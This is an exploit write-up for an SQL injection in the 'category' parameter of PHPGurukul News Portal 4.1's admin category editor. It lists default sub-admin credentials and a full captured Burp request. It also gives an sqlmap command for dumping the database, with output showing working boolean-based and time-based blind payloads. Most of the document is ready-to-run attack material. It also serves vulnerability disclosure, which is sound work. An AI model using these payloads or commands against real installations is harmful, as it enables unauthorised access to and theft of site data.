# News Portal - SQL Injection - 2
+ **Exploit Title:** News Portal - SQL Injection - 2
+ **Date:** 2024-01-04
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://phpgurukul.com/news-portal-project-in-php-and-mysql/
+ **Software Link:** https://phpgurukul.com/?sdm_process_download=1&download_id=7643
+ **Version:** 4.1
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number

## Description:
News Portal System  4.1 allows SQL Injection via the 'category' parameter in "http://localhost//newsportal/admin/edit-category.php". Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost//newsportal/admin/index.php"
+ Log in with `subadmin` :`Test@123`
+ Click manage category then click edit button.
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
POST /newsportal/admin/edit-category.php?cid=3 HTTP/1.1
Host: localhost
Content-Length: 58
Cache-Control: max-age=0
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/newsportal/admin/edit-category.php?cid=3
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: language=en; continueCode=5vLeVxlRzkNb47vKDPMo5Lq8wdzLtvf1Hem0jn6EZm2ygrX19BpaQWOJY3oM; welcomebanner_status=dismiss; cookieconsent_status=dismiss; PHPSESSID=atd99ug4tbmj4a98tofev1o1ro
Connection: close

category=Sports&description=Related+to+sports+news&submit=
```

+ Use sqlmap to exploit. In sqlmap, use 'category' parameter to dump the database.
```
sqlmap -r r.txt -p category --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: category (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: category=Sports' WHERE 7047=7047 AND 4775=(SELECT (CASE WHEN (4775=4775) THEN 4775 ELSE (SELECT 9827 UNION SELECT 3603) END))-- -&description=Related to sports news&submit=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: category=Sports' WHERE 8635=8635 AND (SELECT 7111 FROM (SELECT(SLEEP(5)))PUdp)-- oNUa&description=Related to sports news&submit=
---
[18:36:41] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.2.12, Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[18:36:41] [INFO] fetching current database
[18:36:41] [INFO] retrieving the length of query output
[18:36:41] [INFO] retrieved: 10
[18:36:43] [INFO] retrieved: newsportal             
current database: 'newsportal'
```
+ current database: `newsportal`

![Ekran görüntüsü 2024-04-01 014150](https://github.com/BurakSevben/CVEs/assets/117217689/284af719-6b5a-41af-bffb-c51e2d8d4df0)
